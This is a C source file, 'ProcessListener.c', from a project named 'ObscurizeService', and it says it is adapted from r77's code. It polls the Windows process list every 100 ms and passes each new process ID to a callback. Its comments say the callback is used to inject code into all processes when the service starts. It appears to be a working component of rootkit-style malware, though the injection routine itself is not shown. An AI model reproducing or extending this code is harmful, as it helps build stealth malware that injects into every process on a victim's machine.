#include "ProcessListener.h"
#include <Psapi.h>

// ============================================================
//  ObscurizeService – ProcessListener.c
//
//  Polls EnumProcesses every 100 ms.  Any PID that did not
//  exist in the previous snapshot is treated as a new process
//  and passed to the registered callback.
//
//  The first iteration fires the callback for every currently
//  running process (initial injection into all processes at
//  service startup).
//
//  Adapted directly from r77's ProcessListener.c.
// ============================================================

static DWORD WINAPI NewProcessListenerThread(LPVOID param)
{
    OBS_PID_CALLBACK callback = (OBS_PID_CALLBACK)param;

    LPDWORD current  = (LPDWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DWORD) * 10000);
    LPDWORD previous = (LPDWORD)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(DWORD) * 10000);

    if (!current || !previous)
    {
        if (current)  HeapFree(GetProcessHeap(), 0, current);
        if (previous) HeapFree(GetProcessHeap(), 0, previous);
        return 1;
    }

    DWORD currentCount  = 0;
    DWORD previousCount = 0;

    while (TRUE)
    {
        DWORD bytesReturned = 0;
        if (EnumProcesses(current, sizeof(DWORD) * 10000, &bytesReturned))
        {
            currentCount = bytesReturned / sizeof(DWORD);

            for (DWORD i = 0; i < currentCount; i++)
            {
                BOOL isNew = TRUE;
                for (DWORD j = 0; j < previousCount; j++)
                {
                    if (current[i] == previous[j])
                    {
                        isNew = FALSE;
                        break;
                    }
                }
                if (isNew)
                    callback(current[i]);
            }

            // Swap buffers
            CopyMemory(previous, current, sizeof(DWORD) * currentCount);
            previousCount = currentCount;
        }

        Sleep(100);
    }

    HeapFree(GetProcessHeap(), 0, current);
    HeapFree(GetProcessHeap(), 0, previous);
    return 0;
}

HANDLE StartNewProcessListener(OBS_PID_CALLBACK callback)
{
    return CreateThread(NULL, 0, NewProcessListenerThread, (LPVOID)callback, 0, NULL);
}
